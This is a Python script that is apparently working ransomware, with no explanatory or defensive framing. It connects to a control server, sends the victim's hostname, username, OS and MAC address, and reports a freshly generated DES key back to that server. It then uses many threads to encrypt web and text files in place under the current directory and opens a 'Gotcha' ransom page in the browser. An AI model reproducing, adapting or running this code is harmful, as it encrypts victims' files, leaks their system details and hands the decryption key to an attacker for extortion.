#import modules
import os
import random
import socket
import json;
import uuid
from datetime import datetime
import random
from threading import Thread
from queue import Queue
from pyDes import des, CBC, PAD_PKCS5
import binascii
import webbrowser
import platform



# define constants
SERVER_IP = "192.168.3.144";
SERVER_PORT = 5678;


def find_files_path():
    extensions_to_encrpt = ('.css','.html',".js",".json",".php",".txt");

    # grab all files
    selected_files_path = []
    for root, dirs,files in os.walk("./"):
        for file in files:
            if file.endswith(extensions_to_encrpt):
                selected_files_path.append (os.path.join(root, file))


    return selected_files_path;
        


def generate_rsa_key():
    
    # generate key pool
    key_character_pool = "";
    for i in range(0x21,0x7E):
        key_character_pool += (chr(int(i)))
        
    
    # generate encryption key  
    encryption_level = 8;
    encryption_key = "";
    for i in range(encryption_level):
        encryption_key += random.choice(key_character_pool);
        
    return encryption_key;


def des_encrypt(s,key):
    secret_key = key;
    iv = secret_key
    k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5)
    en = k.encrypt(s, padmode=PAD_PKCS5)
    return binascii.b2a_hex(en).decode()

def des_decrypt(s,key):
    secret_key = key;
    iv = secret_key
    k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5)
    de = k.decrypt(binascii.a2b_hex(s), padmode=PAD_PKCS5)
    return de.decode()

def custom_encrypt_files(encryption_key,q):
  
    while q.not_empty:
        file = q.get();
        try:
            with open(file,'rb') as f:
                data = f.read();
                
            if data:
                with open(file,'w') as f:
                    data = des_encrypt(data,encryption_key)
                    f.write(data)
        except:
            pass;
        
        q.task_done();

def custom_decrypt_files(encryption_key,q):
  
    while q.not_empty:
        file = q.get();
        try:
            with open(file,'rb') as f:
                data = f.read();
                
            if data:
                with open(file,'w') as f:
                    data = des_decrypt(data,encryption_key)
                    f.write(data)
        except:
            pass;
        
        q.task_done();


def prepare_encrypt_file(paths_to_file,encryption_key):
    q = Queue()
    for file in paths_to_file:
        q.put(file);
    
    for i in range(25):
        thread = Thread(target=custom_encrypt_files, daemon= True,args=(encryption_key,q,));
        thread.start();
    
    q.join();
    
    return 1;

def prepare_decrypt_file(paths_to_file,encryption_key):
    q = Queue()
    for file in paths_to_file:
        q.put(file);
    
    for i in range(25):
        thread = Thread(target=custom_decrypt_files, daemon= True,args=(encryption_key,q,));
        thread.start();
    
    q.join();
    
    return 1;





def get_target_system_information():
    
    target_information = {
        "target_hostname" : socket.gethostname(),
        "target_machine_arch" : platform.machine(),
        "target_os_version": platform.version(),
        "target_platform" : platform.platform(),
        "target_user_info" : platform.uname(),
        "target_username": os.getenv("USERNAME"),
        "target_system" : platform.system(),
        "target_processor" : platform.processor(),
        }
    
    return target_information



def write_message():
    text = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Document</title>
    </head>
    <body>
        <div class="container">
        <div class="image-container"></div>
        <div class="headlinetext">Gotcha</div>
        <div class="arrow">
            <svg class="arrows">
            <path class="a1" d="M0 0 L30 32 L60 0"></path>
            <path class="a2" d="M0 20 L30 52 L60 20"></path>
            <path class="a3" d="M0 40 L30 72 L60 40"></path>
            </svg>
        </div>
        <div class="instructions">
            <h1>INSTRUCTIONS</h1>
            <ol>
            <li>One</li>
            <li>One</li>
            <li>One</li>
            <li>One</li>
            <li>One</li>
            </ol>
        </div>
        </div>
    </body>
    <style>
        * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        }
        .container {
        width: 100%;
        min-height: 100vh;
        background-color: black;
        }

        .image-container {
        width: 100%;
        min-height: 60vh;
        height: 70vh;
        background-image: url("./res/depositphotos_117893952-stock-photo-hacker-with-mask.jpg");
        }
        .headlinetext {
        margin-top: 2%;
        font-size: 80px;
        text-align: center;
        color: red;
        }
        .arrow {
        width: 3%;
        height: 70px;
        margin: 0 auto;
        }

        .arrows {
        width: 60px;
        height: 75px;
        position: absolute;
        left: 50%;
        margin-left: -30px;
        bottom: 20px;
        }

        .arrows path {
        stroke: red;
        fill: transparent;
        stroke-width: 4px;
        animation: arrow 2s infinite;
        -webkit-animation: arrow 2s infinite;
        }

        @keyframes arrow {
        0% {
            opacity: 0;
        }
        40% {
            opacity: 1;
        }
        80% {
            opacity: 0;
        }
        100% {
            opacity: 0;
        }
        }

        @-webkit-keyframes arrow /*Safari and Chrome*/ {
        0% {
            opacity: 0;
        }
        40% {
            opacity: 1;
        }
        80% {
            opacity: 0;
        }
        100% {
            opacity: 0;
        }
        }

        .arrows path.a1 {
        animation-delay: -1s;
        -webkit-animation-delay: -1s; /* Safari 和 Chrome */
        }

        .arrows path.a2 {
        animation-delay: -0.5s;
        -webkit-animation-delay: -0.5s; /* Safari 和 Chrome */
        }

        .arrows path.a3 {
        animation-delay: 0s;
        -webkit-animation-delay: 0s; /* Safari 和 Chrome */
        }

        .instructions h1 {
        margin-top: 10%;
        color: green;
        text-align: center;
        font-size: 60px;
        }

        .instructions ol {
        margin-top: 2%;
        padding-bottom: 5%;
        }

        .instructions ol li {
        color: green;
        text-align: center;
        font-size: 32px;
        margin-top: 12px;
        }
    </style>
    </html>


    '''

    file = open("message.html","wb")
    file.write(text.encode())
    file.close()

    webbrowser.open('message.html')


def main():
    # create and maintain socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    
        # connect with server
        s.connect((SERVER_IP,SERVER_PORT));
        
        s.send("0".encode('utf-8'))
    
        # Get target system information ,encode and send it
        system_information = get_target_system_information();
        s.send(json.dumps(system_information,indent=2).encode('utf-8'));
    
        # Check Server attack response
        attack_status = s.recv(1024);
        
        # Negative on attack
        if(attack_status.decode('utf-8') == '0'):
            s.close();
            
        else:
            encryption_key = generate_rsa_key();
            attack_time = str(datetime.now());
            target_mac = hex(uuid.getnode());
        
            system_information.update({
                'encryption_key': encryption_key,
                'attack_timestamp' : attack_time ,
                'target_mac': target_mac,
            });
            s.send(json.dumps(system_information,indent=2).encode('utf-8'));
            
            # wait for key saved response
            key_saved_status = s.recv(1024);
            
            if key_saved_status.decode('utf-8') == '0':
                print("Key Saving Issue");
                s.close()
                
            else:
                all_files_path  =find_files_path();
                prepare_encrypt_file(all_files_path,encryption_key);
                
                # prepare html
                write_message();
                
    
main()
